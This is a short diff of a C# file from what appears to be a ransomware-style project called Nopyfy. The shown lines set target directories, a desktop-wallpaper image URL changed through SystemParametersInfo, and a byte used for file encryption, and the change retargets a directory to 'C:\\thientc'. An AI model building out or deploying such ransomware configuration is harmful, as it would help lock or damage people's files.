@@ -28,7 +28,7 @@ namespace Nopyfy_Decrypter
         private static extern Int32 SystemParametersInfo(UInt32 action, UInt32 uParam, String vParam, UInt32 winIni);
         string userName = Environment.UserName;
         string userDirC = "C:\\";
-        string userDirD = "F:\\";
+        string userDirD = "C:\\thientc";
         string backgroundImageUrl = "http://i.imgur.com/5Yuq9Qv.jpg"; //desktop background picture
         //write Encryption byte above 15 (same thing do in decrypter)
         byte nop_byte = 100;
